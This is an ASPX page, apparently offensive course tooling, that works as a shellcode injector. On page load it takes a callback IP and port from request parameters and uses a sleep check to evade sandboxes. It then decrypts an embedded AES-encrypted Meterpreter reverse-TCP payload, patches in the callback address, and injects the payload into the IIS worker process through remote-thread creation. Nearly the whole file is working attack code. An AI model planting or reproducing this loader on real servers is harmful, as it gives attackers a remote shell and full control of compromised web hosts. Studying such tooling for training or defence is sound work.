<%@ Page Language="C#" AutoEventWireup="true" Debug="true"%>
<!-- Remove 'Debug="true"' from the above statement, as well as any comments below when ready for use.-->
<h1> ASPX 5h3llc0d3 1nj3c70r</h1>
<p> Check out <a href=https://github.com/hackinaggie/OSEP-Tools-v2/tree/main>hackinaggie/OSEP-Tools-v2</a> for more!</p>

<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")] private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32.dll")] private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")] private static extern void Sleep(uint dwMilliseconds);

    protected void Page_Load(object sender, EventArgs blah)
    {
		string RHOST = Request.ServerVariables["REMOTE_ADDR"];
		if (!string.IsNullOrEmpty(Request["ip"]))
		{
			RHOST = Request["ip"];
		}

		string RPORT = "443";
		if (!string.IsNullOrEmpty(Request["port"]))
		{
			RPORT = Request["port"];
		}
		
		string TGT_PROC = "w3wp";		
		if (!string.IsNullOrEmpty(Request["proc"]))
		{
			TGT_PROC = Request["proc"];
		}

        System.DateTime t1 = System.DateTime.Now;
        Sleep(5000);
        double t2 = System.DateTime.Now.Subtract(t1).TotalSeconds;
        if (t2 < 4.5)
        {
            return;
        }

        string MyKey = "0C-58-A2-82-30-1A-B6-32-11-90-A6-75-67-2C-7B-8E-13-71-A9-C2-70-B1-9C-23-0F-E8-45-70-BF-B6-6A-EA";
        string Myiv = "44-CB-82-7D-67-4D-2B-18-A9-64-5E-40-57-85-2B-C9";
        // windows/x64/meterpreter/reverse_tcp
        byte[] buf = new byte[1536] { 0x21, 0xae, 0x78, 0x4b, 0x6e, 0x21, 0x0f, 0x36, 0x23, 0x66, 0xe4, 0x2b, 0x60, 0xe6, 0x4e, 0x92, 0x3c, 0x14, 0x8e, 0x43, 0x95, 0xa3, 0x29, 0xf7, 0xfc, 0xed, 0x69, 0x7c, 0x27, 0xaa, 0xca, 0xfa, 0xe3, 0x4a, 0x89, 0x0e, 0xf3, 0xcc, 0x74, 0x45, 0x4d, 0xa0, 0xa1, 0xbb, 0xbe, 0xaa, 0x9d, 0x17, 0xc8, 0x32, 0xe1, 0xe3, 0x66, 0x49, 0x6c, 0xe1, 0x46, 0x1a, 0x1b, 0xd5, 0xc5, 0x6c, 0xf0, 0x79, 0x70, 0xf8, 0x8e, 0xcd, 0x53, 0xa3, 0xa4, 0x5f, 0x9c, 0xe8, 0x59, 0x35, 0x3b, 0x8e, 0x5b, 0xc1, 0xa0, 0x9c, 0x02, 0x24, 0x4d, 0x4b, 0xbd, 0x94, 0x14, 0xec, 0xfc, 0x4c, 0x06, 0x22, 0x81, 0x61, 0xd7, 0xf9, 0x6c, 0x60, 0x4a, 0xc8, 0x44, 0x8d, 0x9d, 0x93, 0xad, 0xda, 0xe5, 0x86, 0x13, 0xc6, 0x35, 0x44, 0x53, 0xf8, 0xd5, 0xda, 0x68, 0x5e, 0xc0, 0x3e, 0x26, 0x0a, 0x26, 0x69, 0xf5, 0xe9, 0x8b, 0x13, 0x25, 0xa8, 0xc6, 0xde, 0xad, 0xb2, 0x53, 0x34, 0x18, 0x7a, 0x8d, 0x1b, 0xb7, 0x9b, 0x31, 0x7f, 0xba, 0xd1, 0x28, 0xfb, 0xeb, 0xa2, 0x0d, 0x6d, 0x74, 0xfd, 0x63, 0x30, 0xeb, 0x0d, 0x96, 0x2a, 0xfa, 0xc4, 0x77, 0x2c, 0x99, 0xcb, 0x9b, 0xd9, 0xc6, 0x94, 0xe0, 0x21, 0x4c, 0x55, 0x3c, 0xce, 0x7d, 0x64, 0xe1, 0x94, 0x6f, 0xd4, 0x8a, 0x5e, 0x5f, 0xe0, 0x44, 0x78, 0xea, 0xdb, 0x6e, 0x5b, 0x48, 0x7d, 0x6c, 0x3c, 0x09, 0xf9, 0xa6, 0x2e, 0xb7, 0xa5, 0xa8, 0x2a, 0xc8, 0xa3, 0x41, 0x8f, 0xec, 0xde, 0xbf, 0x04, 0x5b, 0x2c, 0x61, 0x0c, 0x37, 0x3b, 0xfa, 0xfc, 0x20, 0x96, 0x5c, 0x02, 0x0b, 0xca, 0x34, 0x58, 0x52, 0xbb, 0x3e, 0x1e, 0x11, 0xcc, 0x0a, 0x84, 0xd3, 0x30, 0x52, 0xd9, 0x5e, 0x97, 0xc3, 0x06, 0x4a, 0xc7, 0x43, 0x67, 0xc8, 0x01, 0xc9, 0xd4, 0x2c, 0xc8, 0x1c, 0xf7, 0xe7, 0x13, 0x6b, 0x13, 0x44, 0xd3, 0x77, 0x96, 0xe0, 0xe4, 0x47, 0x17, 0x78, 0x1b, 0xae, 0xbb, 0x6d, 0xf4, 0xf7, 0x11, 0x69, 0x59, 0xc5, 0x0a, 0x17, 0xff, 0x20, 0xb4, 0x77, 0x0f, 0x74, 0x0e, 0x80, 0x29, 0xc9, 0xe5, 0xd4, 0x0d, 0xdc, 0xdc, 0x31, 0xd8, 0x30, 0xb2, 0x9f, 0x9b, 0xf0, 0x89, 0x91, 0x81, 0xc6, 0x9f, 0xab, 0xa7, 0x50, 0xe8, 0x7b, 0x0f, 0x6c, 0x54, 0xcb, 0x4b, 0x38, 0xcd, 0x4a, 0x15, 0x7b, 0x75, 0xe4, 0xb3, 0x08, 0xd3, 0xeb, 0xed, 0xdd, 0x1e, 0x39, 0x8c, 0x1d, 0xdc, 0xfb, 0xd5, 0xb6, 0x2d, 0xdc, 0x14, 0xec, 0x9e, 0x83, 0x56, 0xc5, 0xe7, 0x7a, 0x00, 0xee, 0xf1, 0xa5, 0x73, 0xfe, 0xd7, 0x00, 0x54, 0xd5, 0x0d, 0x60, 0x9d, 0x29, 0x8a, 0xe1, 0x02, 0x18, 0xc9, 0x28, 0x5d, 0x8a, 0xab, 0x48, 0x51, 0xc2, 0xb8, 0x69, 0xe1, 0x77, 0xcc, 0x55, 0x69, 0x68, 0xd6, 0x3a, 0xd7, 0x00, 0xdd, 0xd1, 0xe8, 0x76, 0xf6, 0x21, 0x98, 0xf9, 0xa7, 0xd4, 0x6c, 0x8e, 0xa6, 0xaf, 0xf4, 0x78, 0x3e, 0xf0, 0x29, 0x6b, 0xdd, 0x69, 0x20, 0xea, 0xd4, 0x2d, 0xee, 0xc4, 0xf6, 0x66, 0x1b, 0xbc, 0x90, 0x90, 0x78, 0x6b, 0x55, 0x03, 0xaf, 0x3f, 0x3b, 0xa8, 0x1c, 0x7f, 0x41, 0x14, 0x3e, 0x07, 0x3a, 0x6e, 0xf9, 0xa7, 0x16, 0x14, 0x83, 0x1f, 0x2c, 0xab, 0x74, 0x95, 0x81, 0xaa, 0xdb, 0xdc, 0xc1, 0xb7, 0xe7, 0x1a, 0x58, 0x78, 0x23, 0x5b, 0x26, 0xad, 0xc8, 0x74, 0xb2, 0xe0, 0x36, 0x19, 0x5c, 0x63, 0x35, 0xdd, 0xf7, 0xfc, 0x75, 0x46, 0x90, 0x3b, 0xb0, 0xff, 0xa9, 0x46, 0x0f, 0xf4, 0xf9, 0xa9, 0x4f, 0xb4, 0x52, 0x7a, 0xde, 0x48, 0x1c, 0xcb, 0x8f, 0xe9, 0x85, 0x5d, 0x58, 0x44, 0x94, 0xcf, 0xb5, 0xdb, 0xea, 0xd4, 0x1a, 0xd3, 0x97, 0x2f, 0x3f, 0xdb, 0x76, 0xec, 0xaa, 0xe3, 0x22, 0xa9, 0xc8, 0xe1, 0x06, 0x17, 0x73, 0xa9, 0x37, 0xfd, 0xc8, 0x93, 0x66, 0x3d, 0xc1, 0x4a, 0xdd, 0xbb, 0x18, 0xf4, 0xa7, 0x5a, 0x3c, 0x99, 0x17, 0xaf, 0xaf, 0x45, 0xee, 0x3b, 0x32, 0x90, 0x7d, 0xc8, 0x27, 0xb1, 0x4f, 0x9b, 0x2b, 0x06, 0x20, 0xf4, 0x01, 0x5d, 0x1c, 0xa9, 0x91, 0xa5, 0xd5, 0x21, 0xa1, 0x86, 0xf8, 0x0b, 0xcc, 0x67, 0x64, 0xef, 0xfe, 0x00, 0xaa, 0x34, 0x76, 0x4e, 0xc0, 0xd7, 0xb6, 0x88, 0xa7, 0xb7, 0x47, 0xf3, 0x93, 0x3e, 0x1d, 0x69, 0x3c, 0xca, 0x6b, 0x4f, 0xb6, 0x8e, 0xa2, 0x28, 0xb8, 0xe8, 0xcb, 0x35, 0x6d, 0x09, 0x87, 0xf7, 0xde, 0x4a, 0x34, 0xad, 0x83, 0x81, 0xaa, 0x88, 0x82, 0xe0, 0x74, 0x2d, 0xe6, 0xae, 0x40, 0x19, 0xf4, 0x3d, 0x40, 0xab, 0x43, 0xd7, 0x0a, 0x78, 0x6e, 0x30, 0x6d, 0xfb, 0xaf, 0x72, 0xb7, 0xd4, 0xd1, 0x03, 0x05, 0x3d, 0xf4, 0x71, 0xc1, 0x11, 0x8d, 0xbb, 0x8e, 0x4f, 0xfa, 0x18, 0xab, 0x06, 0xc8, 0xc1, 0x75, 0xfc, 0x98, 0x7c, 0x5b, 0x5a, 0x1c, 0xa8, 0x46, 0xa4, 0xd4, 0x06, 0xac, 0x0c, 0x67, 0x92, 0x9b, 0x5c, 0x59, 0xd5, 0x18, 0x8a, 0x47, 0x00, 0x7c, 0x05, 0x37, 0xbc, 0x6b, 0xfa, 0xb7, 0xb9, 0x5a, 0x3a, 0xc7, 0xf4, 0xa7, 0x53, 0x7a, 0xab, 0xe8, 0xa2, 0xbe, 0xd8, 0xad, 0x61, 0xd1, 0xdc, 0x1a, 0x23, 0x16, 0xdf, 0xd9, 0xb6, 0x2a, 0x24, 0x43, 0x86, 0xdd, 0xc4, 0x97, 0x5a, 0xb1, 0x4e, 0xaf, 0x9a, 0x15, 0x59, 0x0e, 0x00, 0x2d, 0x68, 0xe1, 0xaa, 0x84, 0x2d, 0xa0, 0x74, 0x40, 0x0f, 0xdd, 0x92, 0x27, 0x33, 0xff, 0xec, 0xfd, 0xb2, 0x06, 0xf0, 0xfc, 0x5e, 0xf2, 0xbe, 0xfb, 0x50, 0x1d, 0x8f, 0xa7, 0xec, 0xec, 0xf4, 0x0e, 0x5f, 0xe3, 0x88, 0x26, 0x14, 0xa0, 0xa8, 0xdc, 0x41, 0x82, 0xe0, 0x54, 0x48, 0xe8, 0xde, 0xbe, 0x13, 0x54, 0x86, 0xe1, 0x7f, 0x72, 0x84, 0xeb, 0x28, 0x7f, 0xad, 0x7c, 0x9f, 0xf6, 0x8c, 0x06, 0xaa, 0xee, 0xac, 0x0b, 0x50, 0x53, 0x06, 0x91, 0xd0, 0x9b, 0x54, 0x1a, 0x47, 0xaf, 0x02, 0x75, 0x2c, 0x7e, 0x99, 0x6d, 0xed, 0xaa, 0x67, 0x42, 0x6a, 0x21, 0x60, 0xa6, 0xdf, 0x74, 0x40, 0x21, 0x9c, 0xe5, 0xb6, 0xcc, 0x66, 0x0b, 0x85, 0x12, 0xaa, 0x20, 0x00, 0x42, 0x0b, 0x3c, 0x0d, 0x02, 0xbd, 0x17, 0x8d, 0x9f, 0x4b, 0x80, 0x8b, 0xde, 0x66, 0x99, 0x10, 0x64, 0xce, 0x4e, 0x89, 0x2c, 0x6f, 0xcf, 0x4d, 0xa6, 0x06, 0xa4, 0xe8, 0x23, 0x4c, 0xfb, 0x4e, 0x0f, 0x46, 0xd7, 0x52, 0xfc, 0x4d, 0xda, 0x57, 0x47, 0xf1, 0x21, 0x9a, 0xd5, 0xa7, 0x75, 0xad, 0xe7, 0x24, 0x59, 0x55, 0xb3, 0x8e, 0xeb, 0x22, 0xa6, 0x85, 0xe5, 0x87, 0x64, 0xe4, 0xf2, 0x9d, 0xcd, 0x84, 0x55, 0x44, 0x02, 0x6f, 0xc3, 0x27, 0x84, 0xc4, 0xec, 0x4a, 0x27, 0xd2, 0xba, 0x0e, 0xe1, 0x57, 0x7b, 0xfb, 0xff, 0x2b, 0x27, 0x13, 0xeb, 0x98, 0xb9, 0x8d, 0x4a, 0xb2, 0xb3, 0x3b, 0x72, 0x9d, 0x17, 0x20, 0xa4, 0x2b, 0x8e, 0x1e, 0x11, 0x6a, 0x08, 0xc0, 0x1e, 0x17, 0x80, 0x90, 0x6b, 0xcf, 0xd8, 0x5f, 0x15, 0x10, 0xa6, 0x90, 0xe6, 0x48, 0xef, 0x2b, 0x73, 0xc1, 0x22, 0x26, 0xa4, 0x32, 0xb1, 0xd1, 0xee, 0x73, 0x96, 0xcd, 0xa1, 0x27, 0xe5, 0xf4, 0xb0, 0x06, 0x5e, 0x8e, 0xd7, 0x71, 0x10, 0x47, 0xe6, 0x67, 0x25, 0xfb, 0x35, 0x00, 0x7d, 0x0f, 0x84, 0xeb, 0x3f, 0xb5, 0x94, 0x51, 0x3e, 0x80, 0x1f, 0x7e, 0xfc, 0xfd, 0xab, 0x1f, 0xe5, 0x72, 0xe4, 0x5c, 0xd0, 0x60, 0x66, 0x3a, 0x34, 0x3f, 0x6a, 0x59, 0x1d, 0xe8, 0xab, 0xfa, 0xc0, 0x3b, 0xf4, 0xab, 0x54, 0x55, 0x00, 0xa6, 0x4a, 0x26, 0xc9, 0xc1, 0xe1, 0x08, 0x00, 0x92, 0x56, 0xa6, 0xa0, 0xee, 0x78, 0xa1, 0x52, 0xa9, 0x8a, 0xb1, 0xa9, 0xcc, 0xbd, 0x2b, 0x26, 0xc0, 0xd3, 0x47, 0xdc, 0xac, 0x45, 0xfa, 0x0a, 0xb2, 0x75, 0x6f, 0x0e, 0x34, 0x21, 0xd8, 0xee, 0x09, 0x7e, 0x50, 0x6e, 0xe8, 0xec, 0x11, 0x0a, 0xc2, 0x19, 0x60, 0xdc, 0x26, 0xe4, 0x36, 0x3b, 0xaf, 0xea, 0x02, 0xfd, 0x47, 0xd7, 0xe2, 0x27, 0xe8, 0xd4, 0x95, 0xa8, 0x2f, 0xab, 0xb6, 0xb5, 0x5c, 0x96, 0x6e, 0x5f, 0xcf, 0xde, 0xce, 0x4d, 0x77, 0x66, 0xeb, 0x24, 0x9f, 0x3d, 0x12, 0x01, 0xad, 0x96, 0x85, 0x1b, 0x2d, 0x83, 0xbc, 0x35, 0x77, 0x8e, 0x65, 0x54, 0x2c, 0xd1, 0x45, 0x79, 0x0d, 0xfa, 0x2a, 0xc6, 0xb6, 0x8c, 0x88, 0x5a, 0x72, 0x0f, 0x85, 0x85, 0x19, 0x0e, 0x63, 0x80, 0xdf, 0x9a, 0xf9, 0x7e, 0x31, 0x18, 0xa3, 0xcc, 0xfb, 0x9c, 0x27, 0x0c, 0x68, 0x9d, 0x35, 0x76, 0x9c, 0x2e, 0xe4, 0xfd, 0x22, 0x6c, 0x75, 0xb6, 0xda, 0xe1, 0x8b, 0x3f, 0x88, 0xb6, 0x6d, 0xad, 0x23, 0x6a, 0x6d, 0x96, 0xa4, 0xff, 0x74, 0xec, 0xb6, 0x79, 0x71, 0x98, 0xac, 0x61, 0xbd, 0xb5, 0xc1, 0xda, 0x06, 0x69, 0x82, 0xbd, 0xa9, 0xf2, 0xd3, 0x0d, 0x28, 0x2c, 0x6e, 0xc2, 0x43, 0xbe, 0x77, 0x58, 0x7d, 0xd0, 0x5c, 0x97, 0x9d, 0x79, 0xdc, 0xb9, 0xdd, 0xed, 0x3d, 0x77, 0x7c, 0x57, 0xcd, 0xe7, 0x05, 0x49, 0xc3, 0x37, 0xc2, 0x85, 0x45, 0x7a, 0x29, 0xd5, 0xb1, 0x1d, 0x7f, 0x4f, 0x83, 0x1b, 0x89, 0xc0, 0x05, 0x00, 0xbb, 0xd1, 0x98, 0x6b, 0x2d, 0x32, 0x26, 0x8b, 0x51, 0xee, 0xb1, 0x38, 0x7e, 0x75, 0xb4, 0x37, 0x54, 0xc5, 0xed, 0xed, 0x9c, 0xe1, 0xa1, 0x1d, 0xfb, 0xa4, 0xa0, 0x8b, 0xa9, 0x61, 0x0e, 0x38, 0x30, 0xb1, 0x79, 0x01, 0x55, 0x3b, 0x00, 0xbf, 0xdc, 0xee, 0x4a, 0x40, 0xc9, 0x49, 0xf7, 0x8d, 0x1d, 0xf2, 0xb8, 0xef, 0x1d, 0x2d, 0xc5, 0x0b, 0x66, 0x21, 0x54, 0xc2, 0x95, 0xf8, 0x52, 0xbe, 0x31, 0xed, 0x76, 0xf5, 0xaa, 0x71, 0xb5, 0x79, 0x5f, 0xbf, 0x98, 0x58, 0x4d, 0xda, 0x64, 0xd5, 0x2e, 0x06, 0xbb, 0x18, 0xa6, 0xe3, 0xb7, 0x45, 0xba, 0x11, 0x93, 0x0a, 0x12, 0x48, 0x94, 0xc0, 0xb4, 0x63, 0xb3, 0x75, 0xf0, 0xdd, 0xf7, 0x0c, 0xdc, 0xa3, 0x96, 0xd5, 0x2c, 0x35, 0x47, 0xc8, 0x48, 0x8c, 0x92, 0x23, 0xd6, 0x98, 0x9a, 0x78, 0x01, 0xad, 0x3f, 0xe2, 0xc9, 0x7d, 0x5a, 0x45, 0x26, 0xfb, 0x72, 0xf2, 0x4c, 0x2a, 0xbe, 0xba, 0xed, 0x3d, 0xf4, 0x95, 0xef, 0xd4, 0x45, 0x28, 0x3d, 0xd7, 0x3e, 0x9e, 0x39, 0x2a, 0x42, 0x9d, 0x5e, 0xd9, 0x03, 0x83, 0xda, 0x9e, 0xc4, 0x0e, 0x3b, 0x24, 0xe3, 0xaa, 0x29, 0xd0, 0xbf, 0x89, 0xe1, 0xb0, 0x24, 0x11, 0x04, 0x10, 0x16, 0x5a, 0xf1, 0x98, 0x53, 0xfb, 0x82, 0xf3, 0x4d, 0x00, 0xf4, 0x03, 0xa0, 0xac, 0xa6, 0x78, 0xf7, 0x47, 0x4a, 0x0f, 0xd8, 0xae, 0xec, 0xc2, 0xfe, 0x51, 0x1e, 0x6f, 0x0b, 0x02, 0xf3, 0x2c, 0xfa, 0x52, 0x4b, 0xdb, 0xf3, 0x24, 0x9c, 0xbd, 0x7c, 0xa2, 0x5b, 0x6a, 0xc8, 0x5d, 0x48, 0x12, 0x2e, 0xfd, 0x8a, 0x3d, 0x22, 0xb8, 0xb7, 0x81, 0x74, 0x4f, 0xa6, 0x70, 0x27, 0x89, 0x74, 0x7a, 0xb2, 0xeb, 0xc6, 0x70, 0x8c, 0x5b, 0x10, 0xfa, 0xf7, 0x41, 0x16, 0x04, 0xbc, 0x87, 0x46, 0xd9, 0xc6, 0xdd, 0xa9, 0x6c, 0x6f, 0x0e, 0xf9, 0xb7, 0x31, 0xd3, 0x2e, 0x30, 0x29, 0xae, 0xb0, 0x38, 0xd8, 0xb0, 0x9e, 0x2f, 0xb6, 0x7a, 0x39, 0x6f, 0xe9, 0xe5, 0x9a, 0x5e, 0x71, 0x78 };

        //Convert key to bytes
        string[] c1 = MyKey.Split('-');
        byte[] f = new byte[c1.Length];
        for (int i = 0; i < c1.Length; i++) f[i] = System.Convert.ToByte(c1[i], 16);
        //Convert IV to bytes
        string[] d1 = Myiv.Split('-');
        byte[] g = new byte[d1.Length];
        for (int i = 0; i < d1.Length; i++) g[i] = System.Convert.ToByte(d1[i], 16);
        //Decrypt sc, returns a string
        string roundtrip = DecryptStringFromBytes_Aes(buf, f, g);
        string replaced = IP_PORT_BYTES(RHOST, RPORT, roundtrip);
        // Remove dashes from string, split into array
        string[] roundnodash = replaced.Split('-');

        // Convert Decrypted sc back to bytes
        byte[] e = new byte[roundnodash.Length];
        for (int i = 0; i < roundnodash.Length; i++) e[i] = System.Convert.ToByte(roundnodash[i], 16);

        // get handle to target and inject
        Process[] localByName = System.Diagnostics.Process.GetProcessesByName(TGT_PROC);
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, localByName[0].Id);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, e, e.Length, out outSize);
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }

    static string IP_PORT_BYTES(string ip, string port, string sc)
    {
        //Convert IP to hex
        string[] lharray = ip.Split('.'); // split IP given into octets
        int counter = 0;
        foreach (string i in lharray) //convert each octet into hex
        {
            lharray[counter] = (int.Parse(i).ToString("X"));
            counter += 1;
        }
        string lh = string.Join("-", lharray);
        //convert port to hex
        string lp = int.Parse(port).ToString("X");
        int lportlength = lp.Length;
        //port takes up 2 bytes in shellcode, set first byte to 00 in case port number is low enough it doesn't need first byte
        string lpfirstbyte = "00";
        //Set first port byte if it is long enough to need it
        if (lp.Length > 2)
        {
            if (lp.Length == 3)
            {
                lpfirstbyte = "0" + lp[0].ToString();
            }
            else
            {
                lpfirstbyte = lp[0].ToString() + lp[1].ToString();
            }
        }
        //Set second byte
        string lplastbyte = lp[lportlength - 2].ToString() + lp[lportlength - 1].ToString();
        //Final port bytes
        lp = lpfirstbyte + "-" + lplastbyte;
        string finalsc = sc.Replace("11-11-11-11", lh).Replace("22-22", lp);
        return finalsc;
    }

    static string DecryptStringFromBytes_Aes(byte[] cipherText, byte[] Key, byte[] IV)
    {
        // Check arguments.
        if (cipherText == null || cipherText.Length <= 0)
            throw new ArgumentNullException("cipherText");
        if (Key == null || Key.Length <= 0)
            throw new ArgumentNullException("Key");
        if (IV == null || IV.Length <= 0)
            throw new ArgumentNullException("IV");

        // Declare the string used to hold
        // the decrypted text.
        string plaintext = null;

        // Create an Aes object
        // with the specified key and IV.
        using (System.Security.Cryptography.Aes aesAlg = System.Security.Cryptography.Aes.Create())
        {
            aesAlg.Key = Key;
            aesAlg.IV = IV;
            // Create a decryptor to perform the stream transform.
            System.Security.Cryptography.ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
            // Create the streams used for decryption.
            using (System.IO.MemoryStream msDecrypt = new System.IO.MemoryStream(cipherText))
            {
                using (System.Security.Cryptography.CryptoStream csDecrypt = new System.Security.Cryptography.CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (System.IO.StreamReader srDecrypt = new System.IO.StreamReader(csDecrypt))
                    {
                        // Read the decrypted bytes from the decrypting stream
                        // and place them in a string.
                        plaintext = srDecrypt.ReadToEnd();
                    }
                }
            }
        }
        return plaintext;
    }
</script>
